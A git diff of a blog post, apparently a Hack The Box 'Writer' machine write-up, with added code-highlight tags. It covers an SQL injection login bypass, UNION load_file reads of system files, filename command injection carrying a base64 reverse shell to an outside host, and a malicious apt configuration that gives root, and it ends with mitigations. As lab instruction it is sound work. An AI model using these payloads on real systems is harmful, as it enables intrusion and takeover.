@@ -7,9 +7,7 @@ image:  '/images/0xd4y-logo-gray.png'
 tags:   [SQLi, SMTP, RCE, APT]
 ---
 
-
-
-   ![](images/image3.png)
+![](images/test/image3.png)
 
 LinkedIn: [https://www.linkedin.com/in/segev-eliezer/](https://www.google.com/url?q=https://www.linkedin.com/in/segev-eliezer/&sa=D&source=editors&ust=1653773864786089&usg=AOvVaw02OXACudSej5nWLBZ4W3Vk) 
 
@@ -112,7 +110,7 @@ Service detection performed. Please report any incorrect results at https://nma
 
 From the nmap scan, it is apparent that the SSH, HTTP, and SMB services are running on the target.  The SMB service is of interest, however there is no anonymous access to any of the shares:
 
-![](images/image1.png)
+![](images/test/image1.png)
 
 Seeing as all of the services are up to date, it follows that the HTTP service must be searched for potential vulnerabilities.
 
@@ -120,10 +118,11 @@ Seeing as all of the services are up to date, it follows that the HTTP service m
 
 Users visiting the target’s web server are met with the following home page:
 
-![](images/image4.png)
+![](images/test/image4.png)
 
 Enumerating the directories of the webpage with gobuster[\[1\]](#ftnt1), the following directories are found:
 
+{% highlight bash %}
 /contact              (Status: 200) \[Size: 4905\]  
 /logout               (Status: 302) \[Size: 208\] \[--> http://10.10.11.101/\]  
 /about                (Status: 200) \[Size: 3522\]  
@@ -132,10 +131,11 @@ Enumerating the directories of the webpage with gobuster[\[1\]](#ftnt1), the fol
 /dashboard            (Status: 302) \[Size: 208\] \[--> http://10.10.11.101/\]  
 /server-status        (Status: 403) \[Size: 277\]  
 /administrative       (Status: 200) \[Size: 1443\]
+{% endhighlight %}
 
 A directory of particular interest is /administrative, especially since it cannot be found without brute forcing directories. Visiting this directory reveals a simple login form which asks for a username and password:
 
-![](images/image2.png)
+![](images/test/image2.png)
 
 Note the domain of the target (namely writer.htb). However, no virtual host routing is present.
 
@@ -144,13 +144,13 @@ SQL Injection
 
 When inputting ’OR 1=1-- - as the username and choosing a random value for the password, the user is automatically authenticated, thus confirming the presence of SQL injection. As an authenticated user, stories can be edited and created, and pictures can be uploaded:
 
-![](images/image5.png)
+![](images/test/image5.png)
 
 The web page does not properly check if an uploaded file is an image, as it was possible to upload a reverse shell by the name of php-reverse-shell.jpg.php. This, however, did not lead to RCE as the web page nevertheless treated the file as an image. Furthermore, uploading a malicious image with PHP code did not work.
 
 An addition to the image upload feature is the ability to upload files given a url. This could be utilized to cause the server to perform GET requests to an arbitrary website of the user’s choice:
 
-  
+{% highlight bash %} 
 Request
 
 POST /dashboard/stories/add HTTP/1.1Host: 10.10.11.101  
@@ -192,11 +192,13 @@ http://10.10.15.80/image.jpg
 \-----------------------------12417370376638841362770592069  
 Content-Disposition: form-data; name\="content"Thanks for reading!  
 \-----------------------------12417370376638841362770592069--
+{% endhighlight %}
 
 Note the “image\_url” parameter highlighted in red  
 
 Response
 
+{% highlight bash %}
 ┌─\[✗\]─\[0xd4y@Writeup\]─\[~/business/hackthebox/medium/linux/writer\]  
 └──╼ $sudo nc -lvnp 80  
 listening on \[any\] 80 ...  
@@ -204,6 +206,7 @@ connect to \[10.10.15.80\] from (UNKNOWN) \[10.10.11.101\] 38018GET /image.jp
 Accept-Encoding: identityHost: 10.10.15.80  
 User-Agent: Python-urllib/3.8  
 Connection: close
+{% endhighlight %}
 
 Judging from the user-agent, it was found that the server is running python. After failing to obtain code executions despite trying many different upload attacks, it follows that the source code of the upload feature must be leaked to determine how it works.
 
@@ -213,10 +216,13 @@ This is possible via the load\_file SQL function. Going back to the login page,
 
 Payload
 
+{% highlight bash %}
 uname='union select 1,load\_file('/etc/passwd'),3,4,5,6-- -&password=a
+{% endhighlight %}
 
 Response
 
+{% highlight bash %}
 Welcome root:x:0:0:root:/root:/bin/bash  
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
 bin:x:2:2:bin:/bin:/usr/sbin/nologin  
@@ -255,6 +261,7 @@ postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin
 filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh  
 john:x:1001:1001:,,,:/home/john:/bin/bash  
 mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
+{% endhighlight %}
 
 Getting RCE
 -----------
@@ -265,11 +272,14 @@ Before being able to read the source code of the website, the full path of the f
 
 Payload
 
+{% highlight bash %}
 uname='union select 1,load\_file('/etc/apache2/sites-available/000-default.conf'),3,4,5,6-- -&password=a
+{% endhighlight %}
 
   
 Response
 
+{% highlight bash %}
 Welcome # Virtual host configuration for writer.htb domain  
 &lt;VirtualHost \*:80&gt;  
        ServerName writer.htb  
@@ -313,9 +323,11 @@ Welcome # Virtual host configuration for writer.htb domain
 #  
 #&lt;/VirtualHost&gt;  
 \# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+{% endhighlight %}
 
 In particular, note the directory in which the writer.wsgi file lies in (highlighted in blue). After finding out that the server is running python, fuzzing for files in the root of the web server revealed an \_\_init\_\_.py file within /var/www/writer.htb/writer/. Leaking this file reveals the following contents:
 
+{% highlight python %}
 if request.method == "POST":        if request.files\['image'\]:             image = request.files\['image'\]            if ".jpg" in image.filename:  
                 path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)               image.save(path)$               image = "/img/{}".format(image.filename)           else:$               error = "File extensions must be in .jpg!"               return render\_template('add.html', error\=error)       if request.form.get('image\_url'):  
            image\_url = request.form.get('image\_url')           if ".jpg" in image\_url:               try:                   local\_filename, headers = urllib.request.urlretrieve(image\_url)  
@@ -332,6 +344,7 @@ if request.method == "POST":        if request.files\['image'\]:      
                    except PIL.UnidentifiedImageError:                       os.system("rm {}".format(image))                       error = "Not a valid image file!"                       return render\_template('edit.html', error=error, results=results, id=id)  
                except:                   error = "Issue uploading picture"                   return render\_template('edit.html', error=error, results=results, id=id)           else:  
                error = "File extensions must be in .jpg!"
+{% endhighlight %}
 
 Note the file was shortened to better emphasize the source code of the upload feature. Critically insecure code is highlighted in red, and the text highlighted in purple is the segment that the undermentioned exploit focuses on.
 
@@ -341,6 +354,7 @@ Within the source code are multiple examples of insecure code (explored more in 
 
 Code 
 
+{% highlight python %}
 import urllib  
 import os  
 from flask import request  
@@ -348,6 +362,7 @@ from flask import request
 local\_filename, headers = urllib.request.urlretrieve('http://10.10.15.80/.jpg/1.jpg;sleep')  
 print("The local\_filename is", local\_filename)  
 os.system("mv {} {}.jpg".format(local\_filename, local\_filename))
+{% endhighlight %}
 
 Observe the argument of the urllib.request.urlretrieve() function. The user is in control of this argument. If a user were to upload a file called 1.jpg;sleep, then the server will behave accordingly:
 
@@ -362,12 +377,14 @@ However, when changing the argument to be file:///home/0xd4y/business/hackthebox
 
 After uploading a file with the name \`0xd4y.jpg;echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash\`, it was referenced locally by putting the following in the image\_url parameter: file:///var/www/writer.htb/writer/static/img/0xd4y.jpg;\`echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash\`. A reverse shell was then returned as the www-data user:
 
+{% highlight bash %}
 ┌─\[✗\]─\[0xd4y@Writeup\]─\[~/business/hackthebox/medium/linux/writer\]└──╼ $nc -lvnp 9001  
 listening on \[any\] 9001 ...  
 connect to \[10.10.15.80\] from (UNKNOWN) \[10.10.11.101\] 59938  
 /bin/sh: 0: can't access tty; job control turned off  
 $ whoami  
 www-data
+{% endhighlight %}
 
 Privilege Escalation
 --------------------
@@ -420,16 +437,20 @@ Persistence on this account was maintained by grabbing john’s ssh key.
 
 John is part of the management group which has permission to edit the apt directory /etc/apt/apt.conf.d, a directory which is responsible for containing the apt configurations. As discovered using pspy, there is a cronjob running as root which performs the following command: /usr/bin/apt-get update. Therefore, a malicious configuration that returns a reverse shell can be added to the directory as follows:
 
+{% highlight bash %}
 john@writer:~$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.80 9001 >/tmp/f"};' > /etc/apt/apt.conf.d/0xd4y-pwn
+{% endhighlight %}
 
 When the cronjob runs again, a reverse shell is returned as the root user:
 
+{% highlight bash %}
 ┌─\[✗\]─\[0xd4y@Writeup\]─\[~/business/hackthebox/medium/linux/writer\]└──╼ $nc -lvnp 9001  
 listening on \[any\] 9001 ...  
 connect to \[10.10.15.80\] from (UNKNOWN) \[10.10.11.101\] 56068  
 /bin/sh: 0: can't access tty; job control turned off  
 \# whoami  
 root
+{% endhighlight %}
 
 Post Exploitation Analysis
 ==========================
@@ -443,10 +464,13 @@ SQLi Mitigation (PDO)
 
 This machine contained multiple vulnerabilities, starting with the SQL injection in the /administrative page. The vulnerability lies in the following SQL statement that is performed on the user’s query:
 
+{% highlight sql %}
 "Select \* From users Where username = '%s' And password = '%s'" % (username, password)
+{% endhighlight %}
 
 This insecure SQL statement allows an attacker to add a single quote in their username and then perform an arbitrary SQL statement of their choosing. To mitigate SQL injection attacks, the current recommendation is to use PDO (PHP Data Objects). The following code does not directly pass the user input into the SQL statement. Rather, using PDO tells the server what the SQL query and the user-inputted data are. This is successfully performed because the instruction and user-input are sent separately to the database:
 
+{% highlight php %}
 <?php  
   
 try {  
@@ -461,12 +485,14 @@ try {
 $conn = null;  
   
 ?>
+{% endhighlight %}
 
 Image Upload (RCE)
 ------------------
 
 After successfully performing an SQL injection attack, an upload feature in the webpage was exploited to gain RCE due to insecure python code. System commands and evaluation functions should never be performed on user input. As discussed in [Finding RCE Vulnerability](#h.eswqky3qu6hx), the system() function in the os module was the reason for the critical RCE vulnerability. The following code prevents this vulnerability:
 
+{% highlight python %}
 from werkzeug.utils import secure\_filename
 
 from PIL import Image  
@@ -482,7 +508,9 @@ if filename.split('.')\[-1\] in allowed\_extensions:        try:
                 img.verify()  
                 path = os.path.join('/var/www/writer.htb/writer/static/img/', filename)                image.save(path)  
         except Exception:                print('Invalid image')  
-else:        print('Filename extension not allowed.')
+else:        
+								print('Filename extension not allowed.')
+{% endhighlight %}
 
 The above program verifies if a file is a valid image by first checking its extension. Note that this is different from the source code of the website which simply searches for the presence of the .jpg string in the filename. After verifying the file’s extension, PIL’s verify method is called on the file before the file is uploaded to the img directory.
 
